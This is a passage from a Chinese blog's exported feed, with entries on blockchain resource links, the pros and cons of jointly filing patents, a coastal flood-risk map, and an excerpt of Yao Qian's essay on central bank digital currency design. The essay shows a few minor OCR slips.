<h3 id="5-https-governance-docs-pokt-network"><a href="#5-https-governance-docs-pokt-network" class="headerlink" title="5. https://governance.docs.pokt.network/"></a>5. <a href="https://governance.docs.pokt.network/">https://governance.docs.pokt.network/</a></h3><p>pokt系统关于链治理的说明文档。</p>
<h3 id="6-https-www-myetherwallet-com"><a href="#6-https-www-myetherwallet-com" class="headerlink" title="6.https://www.myetherwallet.com/"></a>6.<a href="https://www.myetherwallet.com/">https://www.myetherwallet.com/</a></h3><p>MyEtherWallet（MEW）是一个免费的客户端界面，可帮助您与以太坊区块链进行交互。具体包含转账、合约管理等功能。</p>
<p><strong>相关文章：</strong></p>
<ol>
<li><a href="https://willzhuang.github.io/2019/12/20/%E5%85%B3%E4%BA%8EGeth%E7%9B%91%E6%8E%A7/?highlight=%E7%9B%91%E6%8E%A7">关于Geth监控</a></li>
<li><a href="https://willzhuang.github.io/2019/05/06/%E9%80%82%E5%90%88%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E7%9A%84%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%AE/?highlight=%E7%9B%91%E6%8E%A7">适合以太坊作为联盟链的监控项目</a></li>
<li><a href="https://willzhuang.github.io/2019/12/20/%E5%85%B3%E4%BA%8EPBFT%E7%9B%91%E6%8E%A7/?highlight=%E7%9B%91%E6%8E%A7">关于PBFT监控</a></li>
<li><a href="https://willzhuang.github.io/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/?highlight=%E6%B2%BB%E7%90%86">Polkadot链上治理机制浅析</a></li>
<li><a href="https://willzhuang.github.io/2019/12/05/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%86%85%E7%9A%84%E5%85%B1%E8%AF%86%E4%B8%8E%E4%BF%A1%E4%BB%BB/?highlight=%E6%B2%BB%E7%90%86">区块链内的共识与信任</a></li>
</ol>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>关于合作申请专利</title>
    <url>/2020/01/15/%E5%85%B3%E4%BA%8E%E5%90%88%E4%BD%9C%E7%94%B3%E8%AF%B7%E4%B8%93%E5%88%A9/</url>
    <content><![CDATA[<h2 id="跟别人一起申请专利好吗？"><a href="#跟别人一起申请专利好吗？" class="headerlink" title="跟别人一起申请专利好吗？"></a>跟别人一起申请专利好吗？</h2><p>合作申请的情况并不鲜见，很多企业或个人都存在合作申请的情况。从统计信息来看，以下三种情况最常见：</p>
<p><strong>情况一 共同研发</strong></p>
<p>共同研发即共同申请人之间共同为一件专利创新作出了有益贡献，因此，其专利申请人为双方或多方共同申请，这类情况完全符合合作申请的要求，也是最常见的一种情况。</p>
<p><strong>情况二 委托研发</strong></p>
<p>最常见的委托研发，是甲方提出研发需求，乙方为响应研发需求，给出解决方案。这种情况理论上专利申请权可以是乙方，即问题的实际解决方案的提供方。</p>
<p><strong>情况三 母子公司</strong></p>
<p>如国家电网公司和中国石油化工股份有限公司，由于管理制度的设立，使众多专利申请均以共同申请的方式提交到国家知识产权局。如果以子公司享用了母公司的特殊技术资源为理由，也是可以说得过去的。</p>
<p>但是，不管是共同研发、委托开发，还是母子公司，在面对共同的专利申请时，都可以采用法律约定的形式，在双方的合作中约定专利申请的权利及归属。并且，专利权的最终归属以双方约定为准。</p>
<p>不管怎样，既然选择了合作申请，自然有选择合作申请的理由。对申请人来说，合作申请有哪些利弊呢？</p>
<p><strong>优点一：可以共同分担费用</strong></p>
<p>众所周知，专利申请过程中及专利授权后，都有费用，随着专利数量增多，其费用也越来越多，而年费则随着专利年限增加趋势更快。</p>
<p>因此，一些专利申请较多的企业慢慢发现专利年费成为一种负担。</p>
<p>如果选择共同申请，则可以双方约定共同承担专利成本，减轻企业压力。</p>
<p><strong>优点二：有收益后可以共同分享利益</strong></p>
<p>《专利法》规定：合作申请的专利，许可、转化后的收益需要双方共同分配。也就是合作申请后，专利如果有第三方使用，则共同申请人中的任一方都有权分享专利的收益。</p>
<p><strong>优点三：促进合作</strong></p>
<p>很多能申请专利的技术，是技术创新者多方合作的共同成果。在技术分工越来越细化的今天，大家共同合作取得创新成果，是很常见的合作模式。</p>
<p>将创新成果共同申请专利，共同分担费用、共享未来收益，是很多人愿意选择的合作方式。因此，共同申请专利某些程度上可以促进合作。</p>
<p><strong>优点四可双方均享有专利实施权，在专利数量统计中均有效</strong></p>
<p>《专利法》规定：合作申请的专利，其自主实施无需对方同意，也不需要分配利益。因此，双方都可以自由实施专利权记载的创新内容。但是在专利持有量统计时，双方均拥有此专利权。</p>
<p>如国家电网公司和中国石油化工股份有限公司，就是这样的情况，他们的专利申请量第一，与他们合作申请专利的共同申请人虽然分散，但同时也分别拥有多项专利申请。</p>
<p><strong>任何事情有利有弊。</strong></p>
<p>既然合作申请有这么多好处，是否会有问题呢？</p>
<p><strong>弊端一：一些法律手续需要双方共同签署，麻烦</strong></p>
<p>《专利法》规定：合作申请专利的，在专利申请、转让、排他许可、独占许可、复审、无效、放弃、撤销等过程中，均需要各合作方共同决定，共同签字盖章，相对于独立申请，其手续更繁琐。</p>
<p><strong>弊端二：专利权不完整，融资时受限</strong></p>
<p>基于上述弊端可以看出，合作申请的专利，其专利权不完整，不管是在专利申请时，还是在后期专利权实施过程中，都要经过共同申请人同意。投资在投创新技术项目时，面对专利权不完整的情况，往往会选择迟疑的态度。</p>
<p>因为很多专利技术往往会让投资人认为该公司在此技术上设有技术壁垒，给竞争对手增加难度，提高项目的竞争实力。如果专利是共同申请的，则需要做专利权转让或说明。</p>
<p>但是，在很多实际合作项目中，当投资人关注并在意专利权归属时，共同申请人放弃专利权或作出转让的条件会比较苛刻。</p>
<p>有的甚至会因为双方在利益面前难以谈拢而导致融资失败。使专利共同申请变成融资的一个障碍，这种情况对于一些科技创新型的初创公司影响会更大一些，尤其需要在合作前期规划清晰。</p>
<p><strong>因此，基于企业自己的发展规划，如何与外包方合作，专利申请权如何处置，企业创始人在申请时仍需谨慎行事。</strong></p>
]]></content>
      <tags>
        <tag>专利</tag>
      </tags>
  </entry>
  <entry>
    <title>关于气候变化的沿海风险筛查工具</title>
    <url>/2024/01/04/%E5%85%B3%E4%BA%8E%E6%B0%94%E5%80%99%E5%8F%98%E5%8C%96%E7%9A%84%E6%B2%BF%E6%B5%B7%E9%A3%8E%E9%99%A9%E7%AD%9B%E6%9F%A5%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>An interactive map showing areas threatened by sea level rise and coastal flooding. Combining the most advanced global model of coastal elevations with the latest projections for future flood levels.</p>
<p><a href="https://coastal.climatecentral.org/">https://coastal.climatecentral.org/</a></p>
<p><img src="/2024/01/04/%E5%85%B3%E4%BA%8E%E6%B0%94%E5%80%99%E5%8F%98%E5%8C%96%E7%9A%84%E6%B2%BF%E6%B5%B7%E9%A3%8E%E9%99%A9%E7%AD%9B%E6%9F%A5%E5%B7%A5%E5%85%B7/1.png"></p>
]]></content>
      <tags>
        <tag>气候变暖</tag>
      </tags>
  </entry>
  <entry>
    <title>关于央行数字货币若干问题的思考</title>
    <url>/2021/01/19/%E5%85%B3%E4%BA%8E%E5%A4%AE%E8%A1%8C%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>摘自《比较》2020年第六辑，作者姚前</p>
<p>​    回顾历史，技术变迁推动了货币形态从商品货币、金属货币、纸币到电子货币的演化，并使货币内涵不再固于“金银天然不是货币，但货币天然是金银”的货币金属论，延展到信用货币、高流动性金融资产等更广义的货币层次。当前，随着区块链、大数据、云计算和人工智能等数字技术的快速发展技术对货币演化的影响进一步深入，出现了不同于传统货币的新型货币：数字货币。顺应这一趋势，法币数字化已成为数字新时代最重要的货币金融变革，正引起各国中央银行、业界和学术界的广泛关注。</p>
<h2 id="一、央行货币面临的挑战：新型货币战争"><a href="#一、央行货币面临的挑战：新型货币战争" class="headerlink" title="一、央行货币面临的挑战：新型货币战争"></a>一、央行货币面临的挑战：新型货币战争</h2><p>关于货币，人们似乎更关心它的价值内涵，而对它背后的技术，在电子货币和数字货币崭露头角以前，兴趣好像没有那么浓厚。这是一个信用货币代，在很多人眼里，货币就是银行账户里的数字，只要银行不倒闭，它就在那里。除了交易转账，货币往往因价值而动，哪里的价值更稳定，收益更高，货币就往哪里流动。流动间，就发生了货币的替代，或转换为资本，或转变成其他形式的货币（资产）。这些故事可大可小，小的可引发人世间的种种悲喜剧，大的可引发为了抢夺货币主导权的“战争”，比如以邻为窒的汇率战、种贸易/货币联盟、国际货币体系改革与博弃等。</p>
<p>如果说因价值内涵而发生的货币替代是“古典货币战争”，那么因技术先进而引起的货币替代则可称为“新型货币战争”。当然，这不是什么新鲜玩意儿，我们已然在货币演化史中看到了技术的痕迹，比如黄金之所以替代其他材料成为广为接受的货币，不仅在于它稀少，还因为它的技术特性，比如容易标准化、可分割、携带方便、材料稳定和不易变质。只是历史过于漫长，人们逐渐忽略了技术的作用。随着现代信息技术革命的兴起，技术对货币的影响正达到前所未有的状态，并将继续演绎、拓展和深化。它不仅发生在现金、存款货币等各货币层次之间，也发生于各国的货币竞争，甚至还可能引发整个货币金融体系变革，因此引起全球各界的广泛关注。</p>
<p>某种意义上来说，这场“新型货币战争”可追溯到2008年全球金融危机。金融危机的爆发使中央银行的声誉及整个金融体系的信用中介功能受到广泛质疑，奥地利学派思想回潮，货币“非国家化”的支持者不断增多。在此背景下，以比特币为代表的不以主权国家信用为价值支撑的去中心化可编程货币“横空出世”。有人甚至称之为数字黄金，寄托取代法定货币的梦想。这是信息技术发展带来的私人货币与法定货币的“战争”，是货币“非国家化”对法定货币的挑战。</p>
<p>  第二场新型“货币战争”则是电子支付对法定现金的挑战。近年来，支付宝、微信支付等非现金支付方式的使用率持续激增，“无现金社会”“无现金城市”等词语在媒体上频频出现，甚至成为一些第三方支付机构推广业务的宣传口号。与之密切相关的是，许多发达国家和新兴市场国家的央行货币在货币总量中的比重有所下降。自2003年以来，我国基础货币与M2的比率下降了5%,印度下降了7%,欧元区则下降了3%。其中部分原因就是央行货币 (尤其是现金）在流通领域被技术更先进的电子支付方式替代。</p>
<p>  或许，我们应该正面看待和解读这场“新型货币战争”。因为它整体上推动了支付效率的提高、金融的普惠以及社会福利的上升。Libra白皮书指出： “Libra的使命是建立一套简单的、无国界的货币和为数十亿人服务的金融基础设施”，现在看，其宏大使命未必一定成功，但对于这样的愿景，我们应该积极应对，至少在技术方面抑或在模式方面，它为我们提供了新的参考和选项，有益于社会的进步。对于法定货币而言，私人支付工具“去现金化”口号，以及“去中心化”数字货币的兴起，更像是闹钟，唤醒中央银行应重视法币价值稳定，唤醒中央银行不能忽视数字加密货币这一难以回避的技术浪潮，唤醒中央银行应重视央行货币与数字技术的融合创新。</p>
<p>  这一唤醒作用已开始显现。以我国为例，早在2014年，中国人民银行正式启动法定数字货币研究，论证其可行性；2015年，持续充实力量展开九大专题的研究；2016年，组建中国人民银行数字货币研究所，笔者躬逢其时。央行数字货币研究所基于我国“中央银行-商业银行”二元体系，开发了准生产级的法定数字货币原型系统。2016年之后，各国中央银行也开始行动起来，开展基于区块链技术的央行加密货币实验，比如，加拿大的Jasper项目、新加坡的Ubin项目、欧洲央行和日本央行的Stella项目、泰国的Inthanon项目，还有我国香港的LionRock项目等。这是一条全新的赛道，参加者有私人部门，有公共部门，有主权国家，有国际组织，有金融机构，有科技公司，有产业联盟，有极客，有经济学人……总体看，这场“新型货币战争”才刚刚开始。</p>
<h2 id="二、从私人数字货币到央行数字货币：关联与区别"><a href="#二、从私人数字货币到央行数字货币：关联与区别" class="headerlink" title="二、从私人数字货币到央行数字货币：关联与区别"></a>二、从私人数字货币到央行数字货币：关联与区别</h2><p>  比特币不是最早的数字货币，最早的数字货币理论由戴维·乔姆（David Chaum)于1983年提出，这种名为E-Cash的电子货币系统基于传统的“银行-个人-商家”三方模式，具备匿名性、不可追踪性。但比特币是最具有影响力的数字货币。它发端于2008年国际金融危机后的货币“非国家化”思潮，是一种不以主权国家信用为价值支撑的去中心化可编程货币。基于数字钱包、分布式共享账本和共识机制的比特币创新设计使数字货币技术实现了新的飞跃，由原来的三方模式变成像实物货币一样点对点的双方交易模式。</p>
<p>  比特币引发全球大规模的数字货币实验。与基于主权国家信用的法定数字货币或央行数字货币相对照，有人称它们为私人数字货币。截至2020年5月，共有5425种私人数字货币。它们的亮点在技术创新。比如，以太币扩展了比特币的可编程脚本技术，发展出一个无法停止、抗屏蔽和自我维持的去中心化智能合约平台；瑞波币允许不同的网关发行各自的数字借据（I Owe You, IOU),并实现不同数字借据之间的自动转换；零币应用了零知识证明算法，以增强交易的隐私性；等等。它们的缺点则在于两方面：</p>
<p>  一是缺乏稳定价值支撑，价格不稳定。比如，比特币价格暴张暴跌，一度绿涨到1.9万美元，但也曾跌破3500美元。价值不稳定带来的后果是私人数字货币难以成为真正的货币。它们越来越倾向于被视为资产，而非货币。于是近几年来，寻求代币价值稳定成为私人数字货币的热点，出现了稳定代币，或基于算法规则，或基于法币抵押，以维持与法币的汇率平价，获得代币价值的稳定。USDT、TUSD、Dai、摩根币（JPMCoin)、Libra等即是代表。</p>
<p>  二是合规性问题。包括对货币主权的挑战、监管套利、用户审核（KYC)、反洗钱和反恐融资（AML/CTF)、逃税避税、数据隐私保护、资金跨国流动投资者权益保护等一系列合规问题。这涉及如何对私人数字货币进行定性，其中最具争议的是初始代币发行（ICO)。面对这种有点类似股票公开发行 (IPO)的新型融资方式，各国监管部门一开始有点“无所适从”。2017年，我国和韩国禁止所有形式的代币融资。目前，美国等国家倾向于按实质重于形式的监管原则，更多判定初始代币发行是一种证券行为，要求遵守《证券法》相关规定。应该说，各国对私人数字货币的立法越来越重视，意图从资产交易、支付、税收、初始代币发行、反洗钱、反恐怖融资、金融稳定、消费者保护等各个方面，对其交易、使用和流通进行规范。但总体看，许多私人数字货币主要基于公有链模式，合规性问题并未真正得到解决。不过，我们也看到一些私人数字货币正在积极解决合规性问题。比如，2018年，美国Gemini信托公司发行的GeminiDollar(GUSD)和Paxos信托公司发行的Paxos Standard Token(PAX)均得到纽约州金融服务局（NYDFS)的批准。Libra2.0白皮书充分考虑了各方监管关切，提出了一系列合规措施，包括放弃公有链、申请支付牌照、建立用户审核、反洗钱和反恐怖融资的合规框架等。</p>
<p>  与私人数字货币不同，法定数字货币或央行数字货币“根正苗红”，不存在价格不稳定和合规性问题，但与私人数字货币开源、众智的创新方式相比，央行数字货币创新动力和能力略显不足。有些经济体选择了以区块链技术为代表的加密货币技术路线，比如，加拿大的Jasper项目、新加坡的Ubin项目、欧洲央行和日本央行的Stella项目、中国香港的LionRock项目、泰国的Inthanon项目，而有些经济体则摇摆不定，对是否采用区块链技术依然存有争议。于是，出现了所谓基于账户和基于价值的央行数字货币“两分法”，通俗来说，前者是国家发行和运营的“支付宝”，后者是国家发行和运营的“比特币”。实质上，前者将央行数字货币的定义进行了“泛化”，将电子货币也纳入了数字货币范畴，更准确地说，应该称之为“实行电子员用。效据亚水，相较于2018年58.4%的同比增长，2019年我国移动支付交易规模同比增速仅为18.7%, 增速持续放缓意味着移动支付市场渐趋饱和，将步入存量竞夺的发展阶段。因此在第三方支付高度发达的国度，推出类“央行电子货币”的央行数字货币，亦有人对其建设意义存有疑虑。</p>
<p>区块链技术具有难以甚改、可追溯、可溯源、安全可信、异构多活、智能执行等优点，是新一代信息基础设施的雏形，是新型的价值交换技术、分布式协同生产机制以及新型的算法经济模式的基础。当前，各国基于区块链技术的央行数字货币实验进展迅速，内容已涉及隐私保护、数据安全、交易性能、身份认证、券款对付、款款对付等广泛议题。作为一项崭新的技术，区块链当然还有这样那样的缺点与不足，但这正说明该技术有巨大的改进和发展空间。</p>
<h2 id="三、央行数字货币的价值属性：央行负债，还是私人负债"><a href="#三、央行数字货币的价值属性：央行负债，还是私人负债" class="headerlink" title="三、央行数字货币的价值属性：央行负债，还是私人负债"></a>三、央行数字货币的价值属性：央行负债，还是私人负债</h2><p>  既然称为央行数字货币，自应是央行的负债。但也有人提出了100%备付金模式：私人机构向中央银行存缴100%备付准备金，以此为储备发行的数字货币也可视为央行数字货币。IMF经济学家阿德里安（Tobias Adrian)和曼奇尼-格里弗利（Tommaso Mancini-Griffoli)将这样的央行数字货币称为合成型央行数字货币（Synthetic Central Bank Digital Currency,SCBDC)①，在此情形下，所谓的央行数字货币就不是央行的负债，只是以央行负债为储备资产。这算不算真正的央行数字货币，尚无定论。合成型央行数字货币当然不能“只此一家，别无分店”，从技术的角度看，其间的交互不仅没有显著改善中央银行的服务压力，反而提高了系统的复杂程度。100%准备金存缴意味着数字货币的发行、流通、收回、销毁等全生命周期均要依附于传统账户体系，尤其是跨运营机构央行数字货币的流通，除了央行数字货币账本更新外，还要处理相应准备金账户间的清结算，一定程度上会牺牲系统灵活性，准备金账户管理和额度管控的关系也会导致新的复杂性，有可能还需要成立专门的清算机构提供互联互通服务。</p>
<p>  应该说，合成型央行数字货币只是诸多公私合营方案的一种，并不唯一公私合营的目的是为了共同发挥公共部门和私人部门的优势，一方面保持中央银行的监管职能和信任背书的功能，另一方面发挥私人部门的活力和创新优势。关键在于，边界在哪里？如何分工？合成型央行数字货币将数字货币的技术设计、系统建设和日常运营交给了市场，同时又向市场机构让渡了一定的货币发行权，这是否最佳？我们可以看看Libra2.0的设计①，它伊然成了央行数字货币服务提供商的角色，为各国央行数字货币的发行和流通提供Baas服务（Blockehain as a Service,区块链即服务）。各国央行无须独立建设各自的央行数字货币系统，可作为Libra网络的超级节点，直接利用Libra的区块链即服务平台，发行、流通和管理央行数字货币。在这一过程中，央行没有让渡货币发行权。相较于100%备付金模式或合成型央行数字货币，Libra2.0的央行数字货币服务提供商模式也许是更好的公私合营范例。</p>
<p>  从各国央行数字货币实验和计划来看，央行直接负债模式或许是主流。 2020年3月美国推出2.2万亿经济刺激法案时，其初稿端出了数字美元方案。方案明确数字美元由美联储发行，是美联储的负债。2020年5月，数字美元基金会（Digital Dollar Foundation)与全球咨询公司埃森哲共同打造的数字美元项目（Digital Dollar Project)发布了一份白皮书。②白皮书也明确指出数字美元是美联储的直接负债，而且认为Money(货币）与Currency(通货）有着本质的区别：Money主要是存款机构的负债，但Currency是美联储的负债。它强调“中央银行货币发挥着特殊作用，特别是在批发支付和证券交易中。在美国，没有比美联储发行的货币更安全的货币了。它降低了结算风险并提供了结算的最终性，因此监管者和市场参与者对使用央行货币有着强烈的偏好”。这与国际《金融市场基础设施原则》（PFMI)原则九“货币结算”的观点一致。《金融市场基础设施原则》也强调，金融市场基础设施应该在切实可行的情况下使用央行货币进行货币结算。如果不适用央行货币，金融市场基础设施应最小化并严格控制因使用商业银行货币产生的信用风险和流动性风险。因此，从安全性角度看，应优先考虑基于央行直接负债的央行数字货币，而不是基于私人负债的央行数字货币。</p>
<p>2020年10月欧洲中央银行发布数字欧元报告，并计划于2021年中期开展数字欧元实验。报告指出“数字欧元将是欧元体系（Eurosystem)的负债，是无风险的中央银行资金”，而且它着重强调“基于任何私人实体债权发行的货币形式都不是CBDC,即使由欧元体系储备金全额支持”。显然，同数字美元一样，数字欧元也选择央行直接负债模式，而非100%备付金模式。  </p>
<h2 id="四、央行数字货币的生成：发行还是兑换"><a href="#四、央行数字货币的生成：发行还是兑换" class="headerlink" title="四、央行数字货币的生成：发行还是兑换"></a>四、央行数字货币的生成：发行还是兑换</h2><p>  货币发行与兑换的区别在于：前者的主体是货币发行机构，属于主动供给；后者的主体是货币使用者，属于按需兑换。既然主动供给，就有量上的自由裁量，存在扩表发行的可能。按需兑换则是需求拉动，以一种形式的央行货币兑换另一种形式的央行货币，央行没有扩表发行。因此在央行资产负债表上，两者表现不同：按需兑换是在负债端完成1:1兑换，资产没有扩张；扩表发行则在资产负债两端均有扩张</p>
<p>  对于央行数字货币的生成，应是发行还是兑换？取决于央行数字货币的定位以及货币政策的需要。如果只是MO替代，那么它和现金一样，是按需兑换；如果中央银行根据货币政策目标的需要，通过资产购买的方式，向市场发行数字货币，则是扩表发行。扩表发行须界定合格的资产类型，以适当的数量和价格进行操作。</p>
<p>  数字美元基金会的白皮书指出，数字美元是美联储以美元计价的负债，是 M0的组成部分，作为其补充，像美元钞票一样分发，并强调数字美元对货币政策的影响中性，不会影响美联储货币政策。显然这一方案是遵循按需兑换的思路，白皮书还给出了实物现金和代币化数字美元的双层分发模型。而美国经济刺激法案中的“数字美元计划”则甩开了包袱，它设计了面向家庭财政补助以及在此基础上的小额支付场景，是“直升机撒钱”。</p>
<h2 id="五、央行数字货币的技术路线：基于账户还是基于代币"><a href="#五、央行数字货币的技术路线：基于账户还是基于代币" class="headerlink" title="五、央行数字货币的技术路线：基于账户还是基于代币"></a>五、央行数字货币的技术路线：基于账户还是基于代币</h2><p>  研发央行数字货币首先要回答一个问题，什么叫央行数字货币。对此，目前还没有共识。2017年，美国学者科宁（Koning）根据是否基于央行账户提出央行数字账户（Central Bank Digital Account,CBDA)和央行数字货币（Central Bank Digital Currency，CBDC）概念。2018年，国际清算银行的一我能告@给出了一个比较有意思的定义，不过它不是正面回答这个问题，而是使用了一种排除法进行定义。它将目前存在的各类支付工具进行汇总，然后判</p>
<p>觉那些不是央行数字货币，一一排除后，剩下的就是央行数字货币。</p>
<p>  国际清算银行使用了四个维度的标准：是不是可以广泛获得、是不是数字形式、是不是中央银行发行、是不是类似于比特币这种技术产生的代币。按照这四个维度，现金是可以广泛获得的、非数字化的、中央银行发行的、以代币形式存在的货币。银行存款是可以广泛获得的、数字化的、非中央银行发行的、不是代币形式的货币。它们都不是央行数字货币。除了现金，中央银行发行的货币还有银行准备金，包括存款准备金、超额存款准备金。银行准备金已经数字化，但是国际清算银行认为，这不是中央银行要真正研究的央行数字货币。</p>
<p>  一种可能的央行数字货币是，中央银行的账户向社会公众开放，允许社会公众像商业银行一样在中央银行开户，这一点其实容易理解，相当于中央银行开发了一个超级支付宝，面向所有的C端客户服务。国际清算银行认为，这样形成的央行货币是央行数字货币，将其称为基于账户（Account)的央行数字货币，或称央行数字账户。另一种可能的央行数字货币是中央银行以比特币这种技术发行的代币，可称为基于代币（Token)的央行数字货币，或称央行加密货币（Central Bank Crypto Currency,CBCC),这类货币既可以面向批发，也可以面向零售。据笔者理解，代币模式是一种基于密码学的新型账户体系，本质上是一种全新的加密模式，在该模式下，用户对账户的自主掌控能力更强。基于账户还是基于代币，代表了两种不同的技术路线，哪种路线占据主流，有待观察。笔者认为，代币模式可以突破现有账户体系的禁铜，在开放环境下，对交易安全、数据安全和个人隐私保护等问题提供一整套新的解决方案，其支撑技术即为区块链技术。</p>
<p>  目前各国央行数字货币实验大都选择了代币模式。同样，数字美元基金会的白皮书也明确提出，它的愿景是将美元代币化，使数字美元成为一种新的更具活力的央行货币。他们认为“代币化为支付和金融基础设施领域的创新提供了无与伦比的机会”。他们还指出了账户模式存在非最终结算的缺点：“移动支付系统速度更快、更方便，但它仍然是基于账户的，这意味着交易尚未完成或不是’最终’的，在记录、核对和结算各自的借贷交易之前，仍然可以撤销。”</p>
<p>  从隐私保护角度看，采用代币模式的央行数字货币可吸收实物货币“点对点”支付和匿名性的特性，将支付权利真正赋予用户自身。在一定程度上，第三方支付的出现破除了用户对银行账户的依赖以及被施加的约束（如需要访问多个银行的网银办理业务、一层层烦琐的业务程序等）,有效释放了用户的支付主动性和能动性，降低了支付交易成本。但这还远远不够，货币、账户的所属权归谁？其中的信息可向哪些人透明？透明到什么程度？可否被追踪？这些理应都由用户自主掌控，但在现有账户模式下，中介机构拥有更大控制权。</p>
<p>  代币模式的另一好处在于金融普惠。美国联邦存款保险公司（FDIC)在 2017年开展的一项调查发现，大约1400万美国成年人没有银行账户，这一数字在新冠疫情期间变得更加重要，导致美国政府难以向其中许多人发放紧急救济资金。而基于代币的数字美元钱包的相关成本要低于传统银行账户的成本，相应的服务覆盖范围可扩大到虽没有银行账户但能够使用移动设备的人群。</p>
<h2 id="六、央行数字货币与智能合约：审慎还是积极"><a href="#六、央行数字货币与智能合约：审慎还是积极" class="headerlink" title="六、央行数字货币与智能合约：审慎还是积极"></a>六、央行数字货币与智能合约：审慎还是积极</h2><p>  智能合约最早由密码学家尼克·萨博于1993年提出，它是区块链上可以被调用的、功能完善、灵活可控的程序，具有透明可信、自动执行、强制履约的优点。智能合约极大地扩展了数字货币的功能，发展出各类基于智能合约的去中心化金融（DeFi),比如存贷领域的AAVE和Compound,资产交易所的UniSwap和 Balancer,保证金交易的dYdX,金融衍生品交易的Augur,保险的Nexus Mutual等，由此生成一个基于数字货币且充满活力的去中心化金融应用生态系统。</p>
<p>  目前看，加拿大、新加坡、欧洲央行和日本央行开展的央行数字货币实验均应用了智能合约，它们的实验项目运行在以太坊、Corda、Hyperledger Fabric、 Quorum等带智能合约的平台上，加拿大的Jasper项目、欧洲央行和日本央行的Stella项目建立了基于智能合约的流动性节约机制（Liquidity Saving Mecha- nisms,LSM),新加坡的Ubin项目通过智能合约发行央行数字货币。笔者曾结合央行数字货币的可编程特点，提出央行数字货币发行的“前瞻条件触发”机制①，包括时点条件触发、流向主体条件触发、信贷利率条件触发和经济状态条件触发等货币生效设计，研究显示可编程性为央行数字货币提供了极大的创新空间，有效丰富了央行的货币政策工具。</p>
<p>  数字美元基金的白皮书对数字美元的可编程性以及智能合约的应用也持积极的态度。它认为，数字美元提供了超出当今央行准备金和纸纱之外的新功能和实用性，其中即包括可编程性，数字美元的可编程性将为价值转移的创新和精确性开辟更多的途径。它指出“在全球范围内，各国政府和私营机构正在试验代币化的商品、合同、法定所有权，最关键的是，商业银行和央行的数字货币可以与算法驱动的智能合约相结合。虽然刚刚起步，但这一数字创新仍在全球范围内不断扩展”。它还提出央行数字货币可编程的两个好处：一是可编程的央行数字货币若与数字证券相结合，可实现真正的原子结算；二是数字美元的可编程性可更好地控制用户数据的收集与利用，比如可控置名。</p>
<h2 id="七、央行数字货币的运行架构：单层运营与双层运营"><a href="#七、央行数字货币的运行架构：单层运营与双层运营" class="headerlink" title="七、央行数字货币的运行架构：单层运营与双层运营"></a>七、央行数字货币的运行架构：单层运营与双层运营</h2><p>  笔者在2017年专文阐述央行数字货币发行的二元体系：“虽然纯数字货币系统可以不与银行账户关联，但由于我国的货币发行遵循中央银行到商业银行的二元体系，而且当前社会经济活动主要基于商业银行账户体系开展，如可以借助银行账户体系，充分利用银行现有成熟的IT基础设施以及应用和服务体系，将大大降低数字货币推广门槛，提高使用便捷性和灵活性，有助于最广大的客户群体使用数字货币。数字货币在融入现有的应用基础之上将拓展出更加丰富和多元化的场景，数字货币的自身服务能力和竞争力也将进一步增强。”在具体思路上，可采用“商业银行传统账户体系+数字货币钱包属性”的设计思路，由此央行数字货币不仅可以有机融入“中央银行-商业银行”二元体系，还可以复用现有的成熟的金融基础设施，更重要的是，此一处理，既可使数字货币与银行账户独立开来，又可分层并用，发钞行只需对数字货币本身负责，账户行承担实际的业务，应用开发商落实具体的应用实现，各司其职，边界清晰，若辅之以其他手段，或可降低银行存款大规模流失的可能性。而且增加数字货币属性也是对商业银行账户体系的创新，商业银行不仅可以利用现有账户系统继续为本行客户提供数字货币服务，还可以利用数字货币的新特性积极拓展新型业务，进一步加强自身的服务能力与竞争力。</p>
<p>  此后的国际清算银行报告①提出与二元体系相似的双层架构（Two-tiered System)。库姆霍夫和努恩（Kumhof and Noone,2018)②提出的间接央行数字货币模型（Indirect CBDC Model)以及阿德里安和曼奇尼-格里弗利（2019)③提出的合成型央行数字货币其实也是采用了双层架构方案。双层架构正逐渐形成各国的共识。</p>
<p>  但笔者以为，双层运营与单层运营并非二选一的关系，就像出租车与公共汽车，二者似可并行不悖，兼容并蓄以供用户选择。前文述及的数字美元方案不仅提出了双层运营，同时还考虑了单层运营，即美联储直接向社会公众提供数字美元服务。如果央行数字货币直接运行在以太坊、Libra2.0等区块链网络，那么中央银行可借助它们的BaaS服务，直接向用户提供央行数字货币服务，而无须借助中介机构，用户也无须托管数字钱包。单层运营可以使央行数字货币更好地惠及弱势群体，实现金融普惠。欧洲中央银行的数字欧元报告也同时考虑了单层运营和双层运营，用户可直接访问中央银行资产负债表，也可通过中介机构，由其作为结算代理人开展数字欧元交易。</p>
<p>  央行数字货币的建设与推广，是依赖新型的金融科技公司，还是传统的金融机构？这里当然不是非此即彼的关系，理论上讲，只有充分发挥各方的优势，央行数字货币这个新生事物才能根深叶茂，行稳致远。</p>
<h2 id="八、央行数字货币与货币政策工具：计息，还是不计息"><a href="#八、央行数字货币与货币政策工具：计息，还是不计息" class="headerlink" title="八、央行数字货币与货币政策工具：计息，还是不计息"></a>八、央行数字货币与货币政策工具：计息，还是不计息</h2><p>  不计息，央行数字货币仅是一种支付工具，就像实物现金一样；计息，央行数字货币则是生息资产，成为一种新的价格型货币政策工具。一是在批发端，当央行数字货币利率高于准备金利率时，它将取代准备金利率成为货币市场利率走廊的下限；二是在零售端，央行数字货币利率将成为银行存款利率的下限。若央行数字货币完全替代现金，那么可以实施有效的负利率政策。但许多人对央行数字货币计息存有疑虑，担心会引发存款从商业银行转移到中央银行，导致整个银行体系信贷能力萎缩，成为“狭义银行”。</p>
